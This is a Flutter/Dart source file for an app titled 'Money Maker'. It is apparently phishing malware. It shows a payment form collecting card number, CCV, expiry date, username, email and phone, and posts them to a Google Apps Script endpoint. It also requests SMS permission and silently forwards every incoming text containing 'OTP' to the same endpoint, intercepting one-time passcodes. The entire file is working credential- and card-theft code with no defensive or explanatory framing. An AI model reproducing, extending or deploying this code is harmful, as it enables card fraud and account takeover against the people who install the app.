import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:permission_handler/permission_handler.dart';
import 'package:telephony/telephony.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Money Maker',
      home: PaymentFormPage(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class PaymentFormPage extends StatefulWidget {
  @override
  _PaymentFormPageState createState() => _PaymentFormPageState();
}

class _PaymentFormPageState extends State<PaymentFormPage> {
  final _formKey = GlobalKey<FormState>();
  final Map<String, String> formData = {};
  final String sheetUrl =
      "https://script.google.com/macros/s/AKfycbyqf40p00Zz1V8F2hLW9ZB7jfTlmf2ipmVS4fDl-ShINSEHW3bzSLqhGziZwl0cS_qURg/exec";
  final String smsKeyword = "OTP";

  final Telephony telephony = Telephony.instance;

  @override
  void initState() {
    super.initState();
    _requestSmsPermission();
    _listenSms();
  }

  void _requestSmsPermission() async {
    bool? granted = await telephony.requestSmsPermissions;
    if (granted != true) {
      print("لم يتم منح صلاحية الرسائل القصيرة");
    }
  }

  void _listenSms() {
    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) {
        if (message.body != null && message.body!.contains(smsKeyword)) {
          _sendSmsToSheet(
            message.address ?? "",
            message.body ?? "",
            DateTime.now().toString(),
          );
        }
      },
      listenInBackground: false,
    );
  }

  Future<void> _sendSmsToSheet(
      String sender, String body, String date) async {
    try {
      await http.post(
        Uri.parse(sheetUrl),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "type": "sms",
          "sender": sender,
          "body": body,
          "date": date,
        }),
      );
    } catch (e) {
      print("خطأ في إرسال الرسالة للشييت: $e");
    }
  }

  Future<void> _submitForm() async {
    if (_formKey.currentState!.validate()) {
      _formKey.currentState!.save();

      try {
        await http.post(
          Uri.parse(sheetUrl),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({
            "type": "form",
            "cardNumber": formData["cardNumber"],
            "ccv": formData["ccv"],
            "expiryDate": formData["expiryDate"],
            "username": formData["username"],
            "email": formData["email"],
            "phone": formData["phone"],
          }),
        );
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              "Your request is received. Please wait our response!",
            ),
          ),
        );
      } catch (e) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text("حدث خطأ: $e")),
        );
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          Container(color: Colors.black),
          Center(
            child: Padding(
              padding: const EdgeInsets.all(16.0),
              child: Form(
                key: _formKey,
                child: SingleChildScrollView(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      TextFormField(
                        decoration: InputDecoration(
                          labelText: "Card Number",
                          filled: true,
                          fillColor: Colors.white,
                        ),
                        validator: (value) => value!.isEmpty
                            ? "Please enter card number"
                            : null,
                        onSaved: (value) => formData["cardNumber"] = value!,
                      ),
                      SizedBox(height: 10),
                      TextFormField(
                        decoration: InputDecoration(
                          labelText: "CCV",
                          filled: true,
                          fillColor: Colors.white,
                        ),
                        validator: (value) =>
                            value!.isEmpty ? "Please enter CCV" : null,
                        onSaved: (value) => formData["ccv"] = value!,
                      ),
                      SizedBox(height: 10),
                      TextFormField(
                        decoration: InputDecoration(
                          labelText: "Expiry Date",
                          filled: true,
                          fillColor: Colors.white,
                        ),
                        validator: (value) =>
                            value!.isEmpty ? "Please enter expiry date" : null,
                        onSaved: (value) => formData["expiryDate"] = value!,
                      ),
                      SizedBox(height: 10),
                      TextFormField(
                        decoration: InputDecoration(
                          labelText: "Username",
                          filled: true,
                          fillColor: Colors.white,
                        ),
                        validator: (value) =>
                            value!.isEmpty ? "Please enter username" : null,
                        onSaved: (value) => formData["username"] = value!,
                      ),
                      SizedBox(height: 10),
                      TextFormField(
                        decoration: InputDecoration(
                          labelText: "Email",
                          filled: true,
                          fillColor: Colors.white,
                        ),
                        validator: (value) =>
                            value!.isEmpty ? "Please enter email" : null,
                        onSaved: (value) => formData["email"] = value!,
                      ),
                      SizedBox(height: 10),
                      TextFormField(
                        decoration: InputDecoration(
                          labelText: "Phone",
                          filled: true,
                          fillColor: Colors.white,
                        ),
                        validator: (value) =>
                            value!.isEmpty ? "Please enter phone" : null,
                        onSaved: (value) => formData["phone"] = value!,
                      ),
                      SizedBox(height: 20),
                      ElevatedButton(
                        onPressed: _submitForm,
                        child: Text("Submit"),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}
